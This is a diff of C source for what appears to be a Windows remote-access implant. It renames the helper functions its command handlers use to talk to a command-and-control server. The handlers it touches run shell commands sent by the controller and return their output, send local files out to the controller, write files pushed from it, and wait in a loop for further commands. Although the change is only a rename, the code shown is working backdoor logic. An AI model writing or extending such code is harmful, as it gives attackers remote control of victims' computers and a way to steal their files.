@@ -15,7 +15,7 @@ void handle_echo()
     struct echo_cmd cmd = {};
 
     log_info("Received ECHO command.");
-    if (recvall_cnc(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining)) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining)) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -23,14 +23,14 @@ void handle_echo()
 
     while (cmd.bytes_remaining)
     {
-        bytes_read = recvall_cnc(cmd.data, min(cmd.bytes_remaining, sizeof(cmd.data)));
+        bytes_read = cnc_recvall(cmd.data, min(cmd.bytes_remaining, sizeof(cmd.data)));
         if (bytes_read == 0)
         {
             return_code = E_CONNECTION_CLOSED;
             goto cleanup;
         }
         cmd.bytes_remaining -= bytes_read;
-        if (send_cnc(cmd.data, bytes_read) != bytes_read)
+        if (cnc_send(cmd.data, bytes_read) != bytes_read)
         {
             return_code = E_CONNECTION_CLOSED;
             goto cleanup;
@@ -51,7 +51,7 @@ void handle_shell()
 
     log_info("Received SHELL command.");
 
-    if (recvall_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len)) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(&cmd.cmd_len, sizeof(cmd.cmd_len)) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -63,7 +63,7 @@ void handle_shell()
         goto cleanup;
     }
 
-    if (recvall_cnc(cmd.cmd, cmd.cmd_len) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(cmd.cmd, cmd.cmd_len) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -75,17 +75,17 @@ void handle_shell()
 
     while (TRUE)
     {
-        bytes_read = read_shell_output(&cmd);
+        bytes_read = shell_read_output(&cmd);
         if (bytes_read != 0)
         {
-            send_cnc(&bytes_read, sizeof(bytes_read));
-            send_cnc(cmd.out, bytes_read);
+            cnc_send(&bytes_read, sizeof(bytes_read));
+            cnc_send(cmd.out, bytes_read);
         }
         else if (WaitForSingleObject(cmd.proc_info.hProcess, 0) == WAIT_OBJECT_0)
         {
-            send_cnc(&bytes_read, sizeof(bytes_read));
-            close_shell(&cmd);
-            send_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
+            cnc_send(&bytes_read, sizeof(bytes_read));
+            shell_close(&cmd);
+            cnc_send(&cmd.exit_code, sizeof(cmd.exit_code));
             break;
         }
     }
@@ -103,7 +103,7 @@ void handle_msgbox()
 
     log_info("Received MSGBOX command.");
 
-    if (recvall_cnc(&cmd.title_len, sizeof(cmd.title_len)) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(&cmd.title_len, sizeof(cmd.title_len)) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -113,14 +113,14 @@ void handle_msgbox()
         return_code = E_OUT_OF_MEMORY;
         goto cleanup;
     }
-    if (recvall_cnc(cmd.title, cmd.title_len) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(cmd.title, cmd.title_len) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
     }
     cmd.title[cmd.title_len] = 0;
 
-    if (recvall_cnc(&cmd.text_len, sizeof(cmd.text_len)) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(&cmd.text_len, sizeof(cmd.text_len)) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -130,7 +130,7 @@ void handle_msgbox()
         return_code = E_OUT_OF_MEMORY;
         goto cleanup;
     }
-    if (recvall_cnc(cmd.text, cmd.text_len) == 0)
+    if (cnc_recvall(cmd.text, cmd.text_len) == 0)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -167,7 +167,7 @@ void handle_upload_file()
 
     log_info("Received UPLOAD_FILE command.");
 
-    if (recvall_cnc(&cmd.local_path_len, sizeof(cmd.local_path_len)) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(&cmd.local_path_len, sizeof(cmd.local_path_len)) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -177,7 +177,7 @@ void handle_upload_file()
         return_code = E_OUT_OF_MEMORY;
         goto cleanup;
     }
-    if (recvall_cnc(cmd.local_path, cmd.local_path_len) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(cmd.local_path, cmd.local_path_len) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -191,14 +191,14 @@ void handle_upload_file()
         goto cleanup;
     }
 
-    if (send_cnc(&return_code, sizeof(return_code)) != sizeof(return_code))
+    if (cnc_send(&return_code, sizeof(return_code)) != sizeof(return_code))
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
     }
 
     cmd.file_size = GetFileSize(file, NULL);
-    if (send_cnc(&cmd.file_size, sizeof(cmd.file_size)) != sizeof(cmd.file_size))
+    if (cnc_send(&cmd.file_size, sizeof(cmd.file_size)) != sizeof(cmd.file_size))
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -212,7 +212,7 @@ void handle_upload_file()
             goto cleanup;
         }
 
-        if (send_cnc(cmd.file_chunk, bytes_read) != bytes_read)
+        if (cnc_send(cmd.file_chunk, bytes_read) != bytes_read)
         {
             return_code = E_CONNECTION_CLOSED;
             goto cleanup;
@@ -241,7 +241,7 @@ void handle_download_file()
 
     log_info("Received DOWNLOAD_FILE command.");
 
-    if (recvall_cnc(&cmd.local_path_len, sizeof(cmd.local_path_len)) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(&cmd.local_path_len, sizeof(cmd.local_path_len)) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -251,7 +251,7 @@ void handle_download_file()
         return_code = E_OUT_OF_MEMORY;
         goto cleanup;
     }
-    if (recvall_cnc(cmd.local_path, cmd.local_path_len) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(cmd.local_path, cmd.local_path_len) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -265,13 +265,13 @@ void handle_download_file()
         goto cleanup;
     }
 
-    if (send_cnc(&return_code, sizeof(return_code)) != sizeof(return_code))
+    if (cnc_send(&return_code, sizeof(return_code)) != sizeof(return_code))
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
     }
 
-    if (recvall_cnc(&cmd.file_size, sizeof(cmd.file_size)) == E_CONNECTION_CLOSED)
+    if (cnc_recvall(&cmd.file_size, sizeof(cmd.file_size)) == E_CONNECTION_CLOSED)
     {
         return_code = E_CONNECTION_CLOSED;
         goto cleanup;
@@ -279,7 +279,7 @@ void handle_download_file()
 
     while (written_file_bytes != cmd.file_size)
     {
-        if ((bytes_read = recvall_cnc(cmd.file_chunk, min(cmd.file_size - written_file_bytes, sizeof(cmd.file_chunk)))) == E_CONNECTION_CLOSED)
+        if ((bytes_read = cnc_recvall(cmd.file_chunk, min(cmd.file_size - written_file_bytes, sizeof(cmd.file_chunk)))) == E_CONNECTION_CLOSED)
         {
             return_code = E_CONNECTION_CLOSED;
             goto cleanup;
@@ -314,7 +314,7 @@ void listen_for_cmds()
     while (TRUE)
     {
         log_info("Waiting for command.");
-        if (recvall_cnc(&cmd, sizeof(struct cmd)) == E_CONNECTION_CLOSED)
+        if (cnc_recvall(&cmd, sizeof(struct cmd)) == E_CONNECTION_CLOSED)
         {
             log_error("Received invalid command.");
             continue;
